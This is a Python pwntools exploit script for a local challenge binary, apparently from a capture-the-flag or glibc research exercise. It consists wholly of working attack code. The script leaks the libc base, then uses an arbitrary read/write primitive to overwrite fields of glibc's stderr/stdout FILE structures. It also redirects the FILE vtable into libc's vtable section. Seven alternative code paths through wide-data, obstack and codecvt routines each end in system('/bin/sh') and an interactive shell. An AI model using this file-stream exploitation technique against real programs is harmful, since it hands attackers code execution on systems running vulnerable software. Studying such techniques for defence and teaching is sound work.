#!/usr/bin/python3
from pwn import *
import pickle
context.update(os="linux", arch="amd64")

NAME = "chall"
p = process(f"./{NAME}", env={"LD_LIBRARY_PATH": "../bins/"})
_, debug = gdb.attach(p, api=True) or (None, None)
libc = ELF("../bins/libc.so.6")
vtable_offset = None

# Load structures
structs_filename = "glibc_structures.pickle"
if os.path.exists(structs_filename):
    with open(structs_filename, "rb") as f:
        struct_IO_FILE, struct_IO_wide_data = pickle.load(f)
else:
    struct_IO_FILE = {field.name:field.bitpos for field in debug.lookup_type("struct _IO_FILE").fields()}
    struct_IO_wide_data = {field.name:field.bitpos for field in debug.lookup_type("struct _IO_wide_data").fields()}
    with open(structs_filename, "wb") as f:
        pickle.dump((struct_IO_FILE, struct_IO_wide_data), f)

# Load function addresses
functions_filename = "function_addresses.pickle"
if os.path.exists(functions_filename):
    with open(functions_filename, "rb") as f:
        function_addresses = pickle.load(f)
else:
    # Get all the pointers in the vtable section
    raw_vtable_bytes = libc.section('__libc_IO_vtables')
    ptrs = []
    for i in range(0, len(raw_vtable_bytes), 8):
        ptr = u64(raw_vtable_bytes[i:i+8])
        if ptr == 0:
            continue
        ptrs.append((ptr, i))

    # Get libc base address
    sharedlibrairies = debug.execute("info sharedlibrary", to_string=True).splitlines()
    for s in sharedlibrairies:
        if "libc.so.6" in s:
            base_addr = int(s.split()[0], 16) - 0x28700 # Warning: offset may change in future versions

    # Get names of all the functions that need to be examined
    function_addresses = {}
    for ptr, section_offset in ptrs:
        function_name = debug.execute(f"info symbol {ptr+base_addr}", to_string=True).split(" in section")[0]
        function_addresses[function_name] = section_offset
    with open(functions_filename, "wb") as f:
        pickle.dump(function_addresses, f)

# Process interaction functions
def read_ptr(address):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Address: ")
    p.sendline(hex(address).encode())
    p.recvuntil(b"Value: ")
    return int(p.recvline(keepends=False).decode(), 16)

def write_data(address, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"Address: ")
    p.sendline(hex(address).encode())
    p.recvuntil(b"Size: ")
    p.sendline(hex(len(data)).encode())
    p.send(data)

# Get leaks
p.recvuntil(b"puts @ ")
libc_puts = int(p.recvline(keepends=False).decode(), 16)
libc_base = libc_puts - libc.sym["puts"]
print(f"libc base is {hex(libc_base)}")

target_fp = stderr = libc_base + libc.sym["_IO_2_1_stderr_"]
print(f"stderr is {hex(stderr)}")

wide_data = read_ptr(stderr + (struct_IO_FILE["_wide_data"] // 8))
print(f"_wide_data is {hex(wide_data)}")

# Utility functions
def get_field_address(name):
    offset = 0
    if "+" in name:
        name, offset = name.split("+")
        offset = int(offset)
    if name == "vtable":
        return target_fp + 0xd8 + offset
    elif name.startswith("_wide_data->"):
        return wide_data + (struct_IO_wide_data[name.split("->")[1]] // 8) + offset
    else:
        return target_fp + (struct_IO_FILE[name] // 8) + offset

def write_field(name, value):
    write_data(get_field_address(name), p64(value))

# Choose code path here
codepath = 6
match codepath:
    case 0:
        # _IO_wdoallocbuf+43
        target_function = "_IO_wfile_overflow"
        write_field("_flags", u64(b"     sh\x00"))
        write_field("_IO_read_ptr", 0)
        write_field("_IO_write_base", 0)
        write_field("_wide_data", stderr-16)
        write_field("_unused2+4", libc_base + libc.sym["system"])
        write_field("_unused2+12", get_field_address("_markers"))
    case 1:
        # _obstack_newchunk+81
        target_function = "_IO_obstack_overflow"
        write_field("_IO_buf_base", libc_base + libc.sym["system"])
        write_field("_IO_buf_end", u64(b"/bin/sh\x00"))
        write_field("_IO_save_base", get_field_address("_IO_buf_end"))
        write_field("_IO_backup_base", 1)
        target_fp = stdout = libc_base + libc.sym["_IO_2_1_stdout_"]
        vtable_offset = 0x38 # _IO_file_xsputn - _IO_file_jumps
    case 2:
        # _obstack_newchunk+451
        target_function = "_IO_obstack_overflow"
        write_field("_flags", get_field_address("_IO_read_ptr"))
        write_field("_IO_read_ptr", u64(b"/bin/sh\x00"))
        write_field("_IO_buf_base", libc_base + libc.sym["system"])
        write_field("_IO_backup_base", 0)
        target_fp = stdout = libc_base + libc.sym["_IO_2_1_stdout_"]
        vtable_offset = 0x38 # _IO_file_xsputn - _IO_file_jumps
    case 3:
        # _IO_switch_to_wget_mode+37
        target_function = "_IO_wfile_seekoff"
        write_field("_flags", u64(b"/bin/sh\x00"))
        write_field("_IO_read_ptr", 0)
        write_field("_wide_data", stderr-16)
        write_field("_unused2+4", libc_base + libc.sym["system"])
        write_field("_unused2+12", get_field_address("_freeres_buf"))
    case 4:
        # __libio_codecvt_in+146
        target_function = "_IO_wfile_underflow"
        write_field("_flags", 0)
        write_field("_IO_read_ptr", 0)
        write_field("_IO_read_end", libc_base + libc.sym["system"])
        write_field("_IO_buf_end", get_field_address("_IO_save_base"))
        write_field("_IO_save_base", 0)
        write_field("_IO_save_end", u64(b"/bin/sh\x00"))
        write_field("_fileno", libc_base + 0x163830) # add rdi, 0x10 ; jmp rcx
        write_field("_codecvt", get_field_address("_IO_buf_end"))
    case 5:
        # __libio_codecvt_out+147
        target_function = "_IO_wfile_sync"
        write_field("_flags", 0)
        write_field("_old_offset", 0)
        write_field("_lock", u64(b"/bin/sh\x00"))
        write_field("_offset", libc_base + 0x163830) # add rdi, 0x10 ; jmp rcx
        write_field("_codecvt", get_field_address("_cur_column"))
        write_field("_wide_data", get_field_address("_offset"))
        write_field("_freeres_list", 0x100)
        write_field("_freeres_buf", libc_base + libc.sym["system"] + 1)
        write_field("__pad5", get_field_address("_fileno"))
        write_field("_mode", 1)
    case 6:
        # __libio_codecvt_length+207
        target_function = "_IO_wfile_sync"
        write_field("_IO_read_end", libc_base + libc.sym["system"])
        write_field("_IO_write_ptr", 0)
        write_field("_IO_buf_base", u64(b"/bin/sh\x00"))
        write_field("_IO_backup_base", libc_base + 0x163830) # add rdi, 0x10 ; jmp rcx
        write_field("_markers", 0xdeadbeef)
        write_field("_chain", 0)
        write_field("_fileno", 0xffffffffffffffff)
        write_field("_cur_column", 0)
        write_field("_offset", get_field_address("_IO_write_ptr"))
        write_field("_codecvt", get_field_address("_offset"))
        write_field("_wide_data", get_field_address("_IO_save_end"))
    case _:
        # Try other code paths here!
        print("Invalid code path")
        exit(1)

# Change vtable offset
vtable_offset = vtable_offset or 0x60 # _IO_file_sync - _IO_file_jumps
new_vtable = libc_base + libc.get_section_by_name("__libc_IO_vtables").header.sh_addr + function_addresses[target_function] - vtable_offset
print(f"New vtable is {hex(new_vtable)}")
if new_vtable < libc_base + libc.get_section_by_name("__libc_IO_vtables").header.sh_addr:
    print("New vtable is outside the __libc_IO_vtables section!")
write_field("vtable", new_vtable)

# Trigger the payload
p.sendline(b"3")

p.interactive()
